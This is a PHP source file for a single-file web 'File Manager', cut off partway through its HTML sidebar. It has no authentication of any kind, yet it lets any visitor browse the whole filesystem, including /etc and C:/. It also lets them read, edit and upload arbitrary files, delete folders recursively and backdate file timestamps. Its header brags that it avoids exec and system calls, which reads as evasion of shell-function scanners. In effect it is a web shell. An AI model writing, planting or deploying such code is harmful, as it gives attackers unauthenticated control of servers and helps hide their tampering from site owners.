<?php
/**
 * Portable PHP File Manager v3.1
 * Single-file, Zero-config, PHP 5.3+ to 8.x
 * Linux / Windows WINNT / XAMPP / WAMP / Laragon / Shared Hosting
 * NO exec/system/shell_exec/passthru/proc_open/popen
 */
error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT);
if (function_exists('ini_set')) { @ini_set('display_errors', '0'); }
if (function_exists('session_status')) {
    if (session_status() === PHP_SESSION_NONE) @session_start();
} else {
    if (!isset($_SESSION)) @session_start();
}

define('FM_VER', '3.1.0');
define('IS_WIN', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
define('MAX_EDIT', 2 * 1024 * 1024);
define('DS', DIRECTORY_SEPARATOR);

// ═══════════════════════════════════════════════════════════════════
//  PATH HANDLING — Works on both Linux (/) and Windows (D:\)
// ═══════════════════════════════════════════════════════════════════

function fm_normalize($path) {
    // Always use forward slash internally
    $path = str_replace('\\', '/', (string)$path);
    // Remove double slashes but preserve drive letter
    $path = preg_replace('#/+#', '/', $path);
    // Remove trailing slash unless it's root (/ or D:/)
    if (strlen($path) > 1 && substr($path, -1) === '/') {
        // Don't strip if it's like D:/
        if (!preg_match('#^[A-Za-z]:/$#', $path)) {
            $path = rtrim($path, '/');
        }
    }
    return $path;
}

function fm_is_root($path) {
    $p = fm_normalize($path);
    if ($p === '/') return true;
    if (preg_match('#^[A-Za-z]:/?$#', $p)) return true;
    return false;
}

/**
 * Get the current browsing path.
 * On Windows: defaults to script dir, can navigate D:/, C:/, etc.
 * On Linux: defaults to script dir, can navigate /, /var, /tmp, etc.
 */
function fm_get_path() {
    $default = fm_normalize(dirname(__FILE__));

    if (isset($_GET['path']) && strlen(trim($_GET['path'])) > 0) {
        $requested = trim($_GET['path']);
    } elseif (isset($_POST['current_path']) && strlen(trim($_POST['current_path'])) > 0) {
        $requested = trim($_POST['current_path']);
    } else {
        return $default;
    }

    $requested = fm_normalize($requested);

    // Try realpath first
    $real = @realpath($requested);
    if ($real !== false && @is_dir($real)) {
        return fm_normalize($real);
    }

    // Direct check (realpath may fail on some systems)
    if (@is_dir($requested)) {
        return $requested;
    }

    return $default;
}

/**
 * Build breadcrumb links from an absolute path.
 * Linux:   / -> home -> user -> public_html
 * Windows: D: -> Simpro -> xampp -> htdocs
 */
function fm_breadcrumb($path) {
    $path = fm_normalize($path);
    $links = array();

    // Detect Windows drive letter
    if (preg_match('#^([A-Za-z]:)(.*)$#', $path, $m)) {
        $drive = $m[1]; // e.g. "D:"
        $rest = $m[2];  // e.g. "/Simpro/xampp/htdocs"
        $links[] = array('name' => $drive . '/', 'path' => $drive . '/');
        $parts = explode('/', trim($rest, '/'));
        $build = $drive;
        foreach ($parts as $p) {
            if ($p === '') continue;
            $build .= '/' . $p;
            $links[] = array('name' => $p, 'path' => $build);
        }
    } else {
        // Linux: starts from /
        $links[] = array('name' => '/', 'path' => '/');
        $parts = explode('/', trim($path, '/'));
        $build = '';
        foreach ($parts as $p) {
            if ($p === '') continue;
            $build .= '/' . $p;
            $links[] = array('name' => $p, 'path' => $build);
        }
    }

    return $links;
}

/**
 * Get parent directory path.
 */
function fm_parent($path) {
    $path = fm_normalize($path);
    if (fm_is_root($path)) return false; // No parent for root
    $parent = dirname($path);
    $parent = fm_normalize($parent);
    // On Windows, dirname('D:/') returns 'D:\' - normalize
    if (IS_WIN && preg_match('#^[A-Za-z]:$#', $parent)) {
        $parent .= '/';
    }
    return $parent;
}

// ═══════════════════════════════════════════════════════════════════
//  HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════════

function fm_size($b) {
    if ($b < 0) return 'N/A';
    $u = array('B', 'KB', 'MB', 'GB', 'TB');
    $s = (float)$b; $i = 0;
    while ($s >= 1024 && $i < count($u) - 1) { $s /= 1024; $i++; }
    return round($s, 2) . ' ' . $u[$i];
}

/**
 * Permission string — exact user-specified bitwise logic.
 */
function fm_perms_full($f) {
    if (IS_WIN) {
        $info = is_dir($f) ? 'd' : '-';
        $info .= is_readable($f) ? 'r' : '-';
        $info .= is_writable($f) ? 'w' : '-';
        $info .= is_readable($f) ? 'r' : '-';
        $info .= is_writable($f) ? 'w' : '-';
        $info .= is_readable($f) ? 'r' : '-';
        return $info;
    }
    if (!function_exists('fileperms')) return 'N/A';
    $perms = @fileperms($f);
    if ($perms === false) return 'N/A';

    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';

    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') :
        (($perms & 0x0800) ? 'S' : '-');
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') :
        (($perms & 0x0400) ? 'S' : '-');
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') :
        (($perms & 0x0200) ? 'T' : '-');

    return $info;
}

function fm_perms_octal($f) {
    if (IS_WIN) return '';
    if (!function_exists('fileperms')) return '';
    $v = @fileperms($f);
    if ($v === false) return '';
    return substr(sprintf('%o', $v), -4);
}

/**
 * 3-color permission: green=writable, white=readable, red=no access
 */
function fm_perm_color($f) {
    if (@is_writable($f)) return 'perm-write';
    if (@is_readable($f)) return 'perm-read';
    return 'perm-none';
}

function fm_clean_name($n) {
    $n = str_replace(chr(0), '', (string)$n);
    $n = str_replace(array('/', '\\', '..'), '', $n);
    return trim($n, ". \t\n\r\0\x0B");
}

function fm_is_text($fn) {
    $el = array('txt','htm','html','php','css','js','json','xml','svg','sql','log',
        'ini','cfg','conf','sh','bat','cmd','py','rb','pl','java','c','cpp','h',
        'hpp','cs','md','yaml','yml','toml','env','htaccess','gitignore',
        'dockerfile','makefile','license','readme','csv','tsv','tex','asp','aspx',
        'jsp','twig','blade','vue','ts','tsx','jsx','scss','sass','less','go',
        'rs','swift','kt','lua','r','ps1','vbs','cgi','phtml','inc','tpl',
        'neon','lock','editorconfig','properties','gradle');
    $ext = strtolower(pathinfo($fn, PATHINFO_EXTENSION));
    if (in_array($ext, $el)) return true;
    $base = strtolower(basename($fn));
    return in_array($base, array('.htaccess','.gitignore','.env','makefile',
        'dockerfile','readme','license','changelog'));
}

function fm_rmdir_r($dir) {
    if (!is_dir($dir)) return false;
    $items = @scandir($dir);
    if ($items === false) return false;
    foreach ($items as $i) {
        if ($i === '.' || $i === '..') continue;
        $p = $dir . DS . $i;
        if (is_dir($p)) { if (!fm_rmdir_r($p)) return false; }
        else { if (!@unlink($p)) return false; }
    }
    return @rmdir($dir);
}

function fm_flash($m, $t) { $_SESSION['_fm_f'] = array('msg' => $m, 'type' => $t); }
function fm_get_flash() {
    if (isset($_SESSION['_fm_f'])) {
        $f = $_SESSION['_fm_f']; unset($_SESSION['_fm_f']); return $f;
    }
    return null;
}

function fm_icon($n, $d) {
    if ($d) return 'folder';
    $e = strtolower(pathinfo($n, PATHINFO_EXTENSION));
    $m = array('php'=>'code','js'=>'code','ts'=>'code','py'=>'code','rb'=>'code',
        'java'=>'code','c'=>'code','cpp'=>'code','cs'=>'code','go'=>'code',
        'rs'=>'code','swift'=>'code','html'=>'web','htm'=>'web','css'=>'web',
        'scss'=>'web','vue'=>'web','jsx'=>'web','tsx'=>'web','svg'=>'web',
        'jpg'=>'img','jpeg'=>'img','png'=>'img','gif'=>'img','webp'=>'img',
        'bmp'=>'img','ico'=>'img','zip'=>'zip','tar'=>'zip','gz'=>'zip',
        'rar'=>'zip','7z'=>'zip','pdf'=>'pdf','doc'=>'doc','docx'=>'doc',
        'xls'=>'xls','xlsx'=>'xls','csv'=>'xls','ppt'=>'ppt','pptx'=>'ppt',
        'mp3'=>'aud','wav'=>'aud','mp4'=>'vid','avi'=>'vid','mkv'=>'vid',
        'sql'=>'db','sqlite'=>'db','json'=>'dat','xml'=>'dat','yaml'=>'dat',
        'yml'=>'dat','md'=>'txt','txt'=>'txt','log'=>'txt','sh'=>'sh',
        'bat'=>'sh','cmd'=>'sh','ini'=>'cfg','cfg'=>'cfg','conf'=>'cfg','env'=>'cfg');
    return isset($m[$e]) ? $m[$e] : 'file';
}

// ═══════════════════════════════════════════════════════════════════
//  MAIN LOGIC
// ═══════════════════════════════════════════════════════════════════

$path = fm_get_path();

// POST handlers
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fm_action'])) {
    $act = $_POST['fm_action'];
    $rp = isset($_POST['current_path']) ? $_POST['current_path'] : $path;

    if ($act === 'upload') {
        if (!isset($_FILES['fm_file']) || $_FILES['fm_file']['error'] === UPLOAD_ERR_NO_FILE) {
            fm_flash('No file selected.', 'error');
        } elseif ($_FILES['fm_file']['error'] !== UPLOAD_ERR_OK) {
            fm_flash('Upload error.', 'error');
        } else {
            $sn = fm_clean_name($_FILES['fm_file']['name']);
            if ($sn === '') { fm_flash('Invalid filename.', 'error'); }
            else {
                $tgt = $rp . DS . $sn;
                if (@move_uploaded_file($_FILES['fm_file']['tmp_name'], $tgt)) {
                    if (function_exists('chmod')) @chmod($tgt, 0644);
                    fm_flash('Uploaded "' . $sn . '".', 'ok');
                } else { fm_flash('Upload failed.', 'error'); }
            }
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($rp)); exit;
    }
    if ($act === 'newfile') {
        $n = fm_clean_name(isset($_POST['fname']) ? $_POST['fname'] : '');
        if ($n === '') fm_flash('Invalid filename.', 'error');
        else {
            $tgt = $rp . DS . $n;
            if (file_exists($tgt)) fm_flash('Already exists.', 'error');
            elseif (@file_put_contents($tgt, '') !== false) {
                if (function_exists('chmod')) @chmod($tgt, 0644);
                fm_flash('File "' . $n . '" created.', 'ok');
            } else fm_flash('Could not create file.', 'error');
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($rp)); exit;
    }
    if ($act === 'newfolder') {
        $n = fm_clean_name(isset($_POST['fname']) ? $_POST['fname'] : '');
        if ($n === '') fm_flash('Invalid name.', 'error');
        else {
            $tgt = $rp . DS . $n;
            if (file_exists($tgt)) fm_flash('Already exists.', 'error');
            elseif (@mkdir($tgt, 0755, true)) fm_flash('Folder "' . $n . '" created.', 'ok');
            else fm_flash('Could not create folder.', 'error');
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($rp)); exit;
    }
    if ($act === 'delete') {
        $p = isset($_POST['fpath']) ? $_POST['fpath'] : '';
        if ($p === '' || fm_is_root($p)) fm_flash('Cannot delete.', 'error');
        elseif (is_dir($p)) { fm_rmdir_r($p) ? fm_flash('Deleted.', 'ok') : fm_flash('Delete failed.', 'error'); }
        elseif (is_file($p)) { @unlink($p) ? fm_flash('Deleted.', 'ok') : fm_flash('Delete failed.', 'error'); }
        else fm_flash('Not found.', 'error');
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($rp)); exit;
    }
    if ($act === 'rename') {
        $old = isset($_POST['fpath']) ? $_POST['fpath'] : '';
        $nn = fm_clean_name(isset($_POST['newname']) ? $_POST['newname'] : '');
        if (!file_exists($old)) fm_flash('Not found.', 'error');
        elseif ($nn === '') fm_flash('Invalid name.', 'error');
        else {
            $np = dirname($old) . DS . $nn;
            if (file_exists($np)) fm_flash('Name exists.', 'error');
            elseif (@rename($old, $np)) fm_flash('Renamed.', 'ok');
            else fm_flash('Rename failed.', 'error');
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($rp)); exit;
    }
    if ($act === 'save') {
        $p = isset($_POST['fpath']) ? $_POST['fpath'] : '';
        $c = isset($_POST['content']) ? $_POST['content'] : '';
        if (!is_file($p)) fm_flash('Invalid file.', 'error');
        else {
            if (!IS_WIN) $c = str_replace("\r\n", "\n", $c);
            if (@file_put_contents($p, $c) !== false) fm_flash('File saved.', 'ok');
            else fm_flash('Save failed.', 'error');
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($rp)); exit;
    }
    if ($act === 'touch') {
        $p = isset($_POST['fpath']) ? $_POST['fpath'] : '';
        if (!file_exists($p)) fm_flash('Not found.', 'error');
        else {
            $ts = (isset($_POST['tstamp']) && strlen(trim($_POST['tstamp'])) > 0) ? @strtotime($_POST['tstamp']) : time();
            if ($ts === false || $ts === -1) $ts = time();
            @touch($p, $ts) ? fm_flash('Timestamp updated.', 'ok') : fm_flash('Failed.', 'error');
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($rp)); exit;
    }
}

// GET: Edit / View
$edit_data = null; $edit_name = ''; $edit_path = '';
$view_data = null; $view_name = '';

if (isset($_GET['edit']) && strlen($_GET['edit']) > 0) {
    $ef = $_GET['edit'];
    if (is_file($ef) && is_readable($ef)) {
        $edit_name = basename($ef);
        $edit_path = $ef;
        $sz = @filesize($ef);
        if ($sz !== false && $sz > MAX_EDIT) fm_flash('File too large.', 'error');
        else {
            $edit_data = @file_get_contents($ef);
            if ($edit_data === false) { fm_flash('Cannot read.', 'error'); $edit_data = null; }
        }
    }
}
if (isset($_GET['view']) && strlen($_GET['view']) > 0) {
    $vf = $_GET['view'];
    if (is_file($vf) && is_readable($vf)) {
        $view_name = basename($vf);
        $sz = @filesize($vf);
        if ($sz !== false && $sz > MAX_EDIT) $view_data = '[ Too large ]';
        else { $view_data = @file_get_contents($vf); if ($view_data === false) $view_data = '[ Cannot read ]'; }
    }
}

// Directory listing
$raw = @scandir($path);
$dirs_list = array(); $files_list = array();
if ($raw !== false) {
    foreach ($raw as $file) {
        if ($file === '.' || $file === '..') continue;
        $fullpath = $path . DS . $file;
        $newpath = fm_normalize($path . '/' . $file); // for URLs
        $is_dir = @is_dir($fullpath);
        $entry = array(
            'name' => $file, 'fullpath' => $fullpath, 'newpath' => $newpath,
            'is_dir' => $is_dir, 'size' => 0, 'mtime' => 0,
            'perms_full' => fm_perms_full($fullpath),
            'octal' => fm_perms_octal($fullpath),
            'perm_color' => fm_perm_color($fullpath),
        );
        $mt = @filemtime($fullpath); $entry['mtime'] = ($mt !== false) ? $mt : 0;
        if (!$is_dir) { $fs = @filesize($fullpath); $entry['size'] = ($fs !== false) ? $fs : 0; }
        $is_dir ? $dirs_list[] = $entry : $files_list[] = $entry;
    }
}
usort($dirs_list, function($a,$b){ return strnatcasecmp($a['name'],$b['name']); });
usort($files_list, function($a,$b){ return strnatcasecmp($a['name'],$b['name']); });
$all_items = array_merge($dirs_list, $files_list);
$total_items = count($all_items);

// Breadcrumb + parent
$bc_links = fm_breadcrumb($path);
$parent_path = fm_parent($path);
$has_parent = ($parent_path !== false);

$flash = fm_get_flash();
$upload_max = function_exists('ini_get') ? @ini_get('upload_max_filesize') : '?';
$self = htmlspecialchars($_SERVER['PHP_SELF']);
$path_enc = urlencode($path);

// Detect Windows drive for sidebar
$win_drive = '';
if (IS_WIN && preg_match('#^([A-Za-z]:)#', $path, $dm)) {
    $win_drive = $dm[1] . '/';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FM — <?php echo htmlspecialchars($path); ?></title>
<style>
:root{--bg-0:#1b1b1b;--bg-1:#222;--bg-2:#2a2a2a;--bg-3:#313131;--bg-4:#3a3a3a;--border:#363636;--border-lt:#454545;--text:#ccc;--text-hi:#fff;--text-lo:#888;--text-dim:#5e5e5e;--accent:#7c8aff;--accent-h:#9ba4ff;--accent-bg:rgba(124,138,255,.09);--ok:#5db86c;--ok-bg:rgba(93,184,108,.07);--ok-bd:rgba(93,184,108,.18);--err:#d95f6e;--err-bg:rgba(217,95,110,.07);--err-bd:rgba(217,95,110,.18);--amber:#c9a04a;--amber-bg:rgba(201,160,74,.07);--grad-btn:linear-gradient(180deg,#7e7e7e,#363636);--grad-btn-h:linear-gradient(180deg,#909090,#444);--r:10px;--r-sm:8px;--r-lg:14px;--r-xl:16px;--shadow:0 4px 24px rgba(0,0,0,.45);--shadow-sm:0 1px 8px rgba(0,0,0,.3);--sw:228px;--sans:'Segoe UI',-apple-system,BlinkMacSystemFont,'Helvetica Neue',sans-serif;--mono:'SF Mono','Cascadia Code','Consolas','DejaVu Sans Mono',monospace}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html{font-size:13px;line-height:1.55}body{font-family:var(--sans);background:var(--bg-0);color:var(--text);min-height:100vh;display:flex;overflow-x:hidden}
a{color:var(--accent);text-decoration:none;transition:color .15s}a:hover{color:var(--accent-h)}
::-webkit-scrollbar{width:6px;height:6px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border-lt);border-radius:10px}
.sb{width:var(--sw);min-width:var(--sw);background:var(--bg-2);border-right:1px solid var(--border);display:flex;flex-direction:column;position:fixed;top:0;left:0;bottom:0;z-index:50;transition:transform .3s ease}
.sb-hd{padding:20px 18px 16px;border-bottom:1px solid var(--border)}.sb-hd-row{display:flex;align-items:center;gap:11px}
.sb-ico{width:36px;height:36px;background:var(--grad-btn);border-radius:var(--r);display:flex;align-items:center;justify-content:center;box-shadow:var(--shadow-sm)}.sb-ico svg{color:#fff}
.sb-hd h1{font-size:14px;font-weight:700;color:var(--text-hi);line-height:1.2}.sb-hd small{font-size:10px;color:var(--text-dim)}
.sb-nav{padding:14px 10px;flex:1;overflow-y:auto}
.sb-lbl{font-size:9.5px;text-transform:uppercase;letter-spacing:1.2px;color:var(--text-dim);padding:12px 10px 6px;font-weight:600}
.sb-btn{display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:var(--r);cursor:pointer;color:var(--text);font-size:12.5px;border:none;background:none;width:100%;text-align:left;font-family:var(--sans);transition:all .18s}
.sb-btn:hover{background:var(--bg-4);color:var(--text-hi)}.sb-btn.on{background:var(--accent-bg);color:var(--accent)}.sb-btn svg{flex-shrink:0;opacity:.45}
.sb-ft{padding:12px 16px;border-top:1px solid var(--border);font-size:10px;color:var(--text-dim);line-height:1.8}.sb-ft b{color:var(--text-lo);font-weight:500}
.mn{margin-left:var(--sw);flex:1;display:flex;flex-direction:column;min-height:100vh}
.tb{min-height:48px;padding:10px 24px;border-bottom:1px solid var(--border);display:flex;align-items:center;background:var(--bg-1);position:sticky;top:0;z-index:30;gap:12px;flex-wrap:wrap}
.bc{display:flex;align-items:center;flex-wrap:wrap;gap:0}.bc a{padding:3px 6px;color:var(--text-lo);font-size:12px;border-radius:var(--r-sm);transition:all .15s}.bc a:hover{color:var(--accent);background:var(--accent-bg);text-decoration:none}
.bc .sp{color:var(--text-dim);margin:0 2px;font-size:13px;opacity:.5}.bc .cr{color:var(--text-hi);font-weight:600;font-size:12px;padding:3px 8px;background:var(--bg-3);border-radius:var(--r-sm)}
.tb-inf{margin-left:auto;font-size:11px;color:var(--text-dim);white-space:nowrap}
.fl{margin:14px 24px 0;padding:11px 16px;border-radius:var(--r);font-size:12px;display:flex;align-items:center;gap:9px;animation:flIn .35s ease}
@keyframes flIn{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:translateY(0)}}
.fl-ok{background:var(--ok-bg);color:var(--ok);border:1px solid var(--ok-bd)}.fl-error{background:var(--err-bg);color:var(--err);border:1px solid var(--err-bd)}
.fp{padding:18px 24px 50px;flex:1}
.ft{width:100%;border-collapse:collapse}.ft th{text-align:left;padding:8px 12px;font-size:10px;text-transform:uppercase;letter-spacing:.9px;color:var(--text-dim);border-bottom:1px solid var(--border);font-weight:600;white-space:nowrap;background:var(--bg-0)}
.ft td{padding:7px 12px;border-bottom:1px solid rgba(54,54,54,.45);font-size:12.5px;vertical-align:middle;white-space:nowrap}.ft tbody tr{transition:background .12s}.ft tbody tr:hover td{background:var(--bg-1)}
.cn{min-width:220px;white-space:normal!important;word-break:break-all}.ca{text-align:right}
.nc{display:flex;align-items:center;gap:9px}
.ic{display:inline-flex;align-items:center;justify-content:center;width:30px;height:30px;border-radius:var(--r-sm);flex-shrink:0}.ic svg{width:16px;height:16px}
.ic-folder{background:var(--amber-bg)}.ic-folder svg{color:var(--amber)}
.ic-code{background:rgba(160,130,255,.07)}.ic-code svg{color:#a882ff}.ic-web{background:rgba(255,130,180,.07)}.ic-web svg{color:#ff82b4}
.ic-img{background:rgba(80,200,120,.07)}.ic-img svg{color:#50c878}.ic-zip{background:rgba(201,160,74,.07)}.ic-zip svg{color:var(--amber)}
.ic-pdf{background:rgba(217,95,110,.07)}.ic-pdf svg{color:var(--err)}.ic-doc{background:rgba(100,140,255,.07)}.ic-doc svg{color:#648cff}
.ic-xls{background:rgba(80,200,120,.07)}.ic-xls svg{color:var(--ok)}.ic-ppt{background:rgba(201,160,74,.07)}.ic-ppt svg{color:var(--amber)}
.ic-aud{background:rgba(80,200,220,.07)}.ic-aud svg{color:#50c8dc}.ic-vid{background:rgba(180,120,255,.07)}.ic-vid svg{color:#b478ff}
.ic-db{background:rgba(201,160,74,.07)}.ic-db svg{color:var(--amber)}.ic-dat{background:rgba(80,200,220,.07)}.ic-dat svg{color:#50c8dc}
.ic-txt{background:rgba(136,136,136,.06)}.ic-txt svg{color:var(--text-lo)}.ic-sh{background:rgba(80,200,120,.07)}.ic-sh svg{color:var(--ok)}
.ic-cfg{background:rgba(136,136,136,.06)}.ic-cfg svg{color:var(--text-lo)}.ic-file{background:rgba(136,136,136,.04)}.ic-file svg{color:var(--text-dim)}
.fn{color:var(--text-hi);font-weight:500;transition:all .15s;cursor:pointer}.fn:hover{text-decoration:none}.fn-dir:hover{color:var(--amber)}.fn-file:hover{color:var(--accent)}
.fn-p{color:var(--text-lo);font-style:italic;font-weight:400}.fn-p:hover{color:var(--text-hi)}.fm{color:var(--text-lo)}
/* 3-COLOR PERMISSIONS */
.perm-cell{font-family:var(--mono);font-size:11px;white-space:nowrap}
.perm-write{color:#0f0}.perm-read{color:#e8e8e8}.perm-none{color:#f00}
.perm-oct{font-size:10px;color:var(--text-dim);margin-left:6px}
.ag{display:flex;gap:2px;justify-content:flex-end}
.ab{display:inline-flex;align-items:center;justify-content:center;width:30px;height:28px;border-radius:var(--r-sm);border:none;background:transparent;color:var(--text-dim);cursor:pointer;transition:all .15s;position:relative}
.ab:hover{background:var(--bg-3);color:var(--text-hi)}.ab.dg:hover{background:var(--err-bg);color:var(--err)}.ab svg{width:14px;height:14px}
.ab[data-t]:hover::after{content:attr(data-t);position:absolute;bottom:calc(100% + 6px);left:50%;transform:translateX(-50%);background:var(--bg-3);color:var(--text-hi);padding:4px 10px;border-radius:var(--r-sm);font-size:10px;white-space:nowrap;z-index:100;pointer-events:none;border:1px solid var(--border-lt);box-shadow:var(--shadow-sm);font-family:var(--sans)}
.ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:200;align-items:center;justify-content:center;backdrop-filter:blur(6px)}.ov.on{display:flex}
.md{background:var(--bg-2);border:1px solid var(--border);border-radius:var(--r-xl);width:92%;max-width:740px;max-height:85vh;display:flex;flex-direction:column;box-shadow:var(--shadow);animation:mu .25s cubic-bezier(.4,0,.2,1)}
@keyframes mu{from{opacity:0;transform:translateY(16px) scale(.97)}to{opacity:1;transform:translateY(0) scale(1)}}.md-lg{max-width:920px}
.mh{padding:16px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}.mh h3{font-size:14px;color:var(--text-hi);font-weight:600}
.mx{background:none;border:none;color:var(--text-dim);cursor:pointer;padding:4px;border-radius:var(--r-sm);display:flex;align-items:center;transition:all .15s}.mx:hover{background:var(--bg-4);color:var(--text-hi)}
.mb{padding:18px 20px;overflow-y:auto;flex:1}.mf{padding:14px 20px;border-top:1px solid var(--border);display:flex;gap:8px;justify-content:flex-end}
.fg{margin-bottom:14px}.fg label{display:block;font-size:11px;color:var(--text-lo);margin-bottom:6px;font-weight:500}
.fi2{width:100%;padding:10px 14px;background:var(--bg-0);border:1px solid var(--border);border-radius:var(--r);color:var(--text-hi);font-size:12.5px;font-family:var(--sans);outline:none;transition:border-color .2s,box-shadow .2s}.fi2:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-bg)}
textarea.fi2{font-family:var(--mono);font-size:12px;resize:vertical;line-height:1.65;tab-size:4;background:#1a1a1a;color:#e0e0e0}
textarea.fi2::-webkit-scrollbar{width:5px}textarea.fi2::-webkit-scrollbar-track{background:#1a1a1a}textarea.fi2::-webkit-scrollbar-thumb{background:var(--border-lt);border-radius:10px}
.dz{padding:28px 20px;border:2px dashed var(--border);background:var(--bg-0);border-radius:var(--r-lg);text-align:center;cursor:pointer;color:var(--text-lo);font-size:12px;transition:border-color .25s}.dz:hover{border-color:var(--text-dim)}.dz input[type=file]{display:none}
.bt{padding:8px 18px;border-radius:var(--r);border:1px solid var(--border);background:var(--grad-btn);color:var(--text-hi);font-size:12px;cursor:pointer;font-family:var(--sans);transition:all .18s;display:inline-flex;align-items:center;gap:6px;font-weight:500;box-shadow:var(--shadow-sm)}.bt:hover{background:var(--grad-btn-h);border-color:var(--border-lt)}
.bt-a{background:var(--accent);border-color:var(--accent);color:#fff}.bt-a:hover{background:var(--accent-h)}
.bt-d{background:transparent;border-color:var(--err);color:var(--err)}.bt-d:hover{background:var(--err-bg)}
.vb{background:#1a1a1a;border:1px solid var(--border);border-radius:var(--r);padding:16px;font-family:var(--mono);font-size:11.5px;white-space:pre-wrap;word-wrap:break-word;overflow-y:auto;max-height:55vh;line-height:1.7;color:var(--text);tab-size:4}
.em{text-align:center;padding:70px 20px;color:var(--text-dim)}.em p{font-size:13px}
.mt{display:none;position:fixed;top:11px;left:11px;z-index:60;background:var(--bg-2);border:1px solid var(--border);border-radius:var(--r);padding:8px 11px;cursor:pointer;color:var(--text);box-shadow:var(--shadow-sm)}
@media(max-width:800px){.sb{transform:translateX(-100%)}.sb.open{transform:translateX(0)}.mn{margin-left:0}.mt{display:block}.tb{padding-left:54px}.fp{padding:14px 12px 40px}.ft .cp,.ft .ct{display:none}.md{width:96%}}
</style>
</head>
<body>
<button class="mt" onclick="document.querySelector('.sb').classList.toggle('open')"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>

<aside class="sb" id="sb">
  <div class="sb-hd"><div class="sb-hd-row">
    <div class="sb-ico"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg></div>
    <div><h1>File Manager</h1><small>v<?php echo FM_VER; ?></small></div>
  </div></div>
  <nav class="sb-nav">
    <div class="sb-lbl">Navigate</div>
    <a class="sb-btn on" href="<?php echo $self; ?>"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg> Home</a>
    <?php if (IS_WIN): ?>
      <a class="sb-btn" href="?path=<?php echo urlencode($win_drive); ?>"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="2"/><line x1="2" y1="12" x2="22" y2="12"/></svg> <?php echo htmlspecialchars($win_drive); ?> (Drive)</a>
      <a class="sb-btn" href="?path=C:/"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="2"/><line x1="2" y1="12" x2="22" y2="12"/></svg> C:/</a>
    <?php else: ?>
      <a class="sb-btn" href="?path=/"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/></svg> / (Root)</a>
      <a class="sb-btn" href="?path=/tmp"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg> /tmp</a>
      <a class="sb-btn" href="?path=/var"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg> /var</a>
      <a class="sb-btn" href="?path=/etc"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg> /etc</a>
    <?php endif; ?>
    <div class="sb-lbl">Actions</div>
    <button class="sb-btn" onclick="mO('mU')"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg> Upload File</button>
